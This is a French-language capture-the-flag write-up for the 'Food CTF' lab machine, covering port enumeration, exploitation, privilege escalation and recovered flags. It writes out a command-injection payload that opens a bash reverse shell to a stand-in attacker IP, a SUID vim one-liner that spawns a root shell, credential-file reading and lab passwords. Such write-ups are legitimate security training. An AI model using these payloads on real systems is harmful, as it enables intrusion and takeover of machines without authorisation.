#  Food CTF - Writeup & Summary

##  Informations Générales

- **Machine :** Food CTF
    
- **Objectif :** Récupérer 8 flags.
    
- **Statut :** Complété (8/8).
    
- **Utilisateurs identifiés :** `root`, `bread`, `food`, `ramen`, `pasta`, `dan`.
    
    +3
    

---

##  Phase d'Énumération

Le scan des ports a révélé plusieurs services critiques :

- **SSH (22)** & **Telnet (46969)**.
    
- **MySQL (3306)**.
    
- **HTTP (15065)** : Serveur Go (Monitoring).
    
- **Port 9999** (Abyss) & **Port 16109** (Unknown).
    

---

##  Vecteurs d'Attaque & Exploitation

### 1. RCE via API Monitoring (User: `bread`)

- **Vulnérabilité :** Injection de commande dans l'API de ping.
    
- **Exploitation :** Utilisation de `curl` pour injecter un reverse shell Bash via le paramètre `/api/cmd`.
    
- **Commande :** `curl -X POST http://[IP]:15065/api/cmd -d "127.0.0.1 ; bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/9001 0>&1'"`
    
- **Accès :** Shell obtenu en tant qu'utilisateur `bread`.
    

### 2. Escalade de privilèges vers `food` (Telnet & ROT12)

- **Indice :** Une chaîne encodée sur le port Telnet : `tccr:uwjsasqccywsg`.
    
- **Décryptage :** Décalage de type **ROT12** donnant `food:givemecookies`.
    
- **Accès :** Connexion réussie via Telnet avec l'utilisateur `food`.
    

### 3. Escalade vers `ramen` & `flag` (MySQL)

- **Fichier sensible :** Lecture de `/etc/mysql/debian.cnf` via `vim.basic` (SUID).
    
- **Extraction :** Accès à la base de données `users`, table `User`.
    
    +1
    
- **Données :** Récupération du mot de passe de `ramen` (`noodlesRTheBest`) et d'un flag.
    

### 4. Escalade vers `pasta` (Stéganographie)

- **Analyse :** Téléchargement de `king.jpg` depuis le port 16109.
    
- **Extraction :** Utilisation de `steghide` (passphrase: `king`) pour extraire `creds.txt`.
    
- **Identifiants :** `pasta:pastaisdynamic`.
    

### 5. Escalade finale vers `root`

- **Vecteur :** Binaire `/usr/bin/vim.basic` avec le bit **SUID root**.
    
- **Exploitation :** `/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'`
    
- **Résultat :** Accès **Root** total.
    

---

##  Flags Récupérés (8/8)

|Ordre|Source / Localisation|Valeur du Flag|
|---|---|---|
|**1**|`/var/flag.txt`|`thm{0c486........3d7ba8}`|
|**2**|`/home/bread/flag` (via vim.basic)|`thm{9f1ee18d30........c58f34db}`|
|**3**|Base de données MySQL (Table User)|`thm{2f30841ff8d96.....5adda8332}`|
|**4**|`/home/food/.flag`|`thm{58a3cb4.......b34fd20a04c1}`|
|**5**|`/home/pasta/flag` (Root access)|`[Trouvé dans root.txt / home]`|
|**6**|`/home/ramen/flag` (Root access)|`[Trouvé dans root.txt / home]`|
|**7**|`/home/tryhackme/flag`|`[Trouvé dans root.txt / home]`|
|**8**|`/root/root.txt`|`[Flag final]`|


---

## 🧠 Notes Techniques & Apprentissages

- **RCE (Remote Command Execution) :** Toujours vérifier les entrées utilisateur envoyées à des fonctions comme `exec.Command` en Go.
    
- **SUID Binaries :** Les outils comme `vim.basic` ou `screen-4.5.0` avec des permissions SUID sont des vecteurs critiques d'escalade de privilèges.
    
- **Stéganographie :** Ne jamais négliger les fichiers multimédias sur des ports "inconnus".
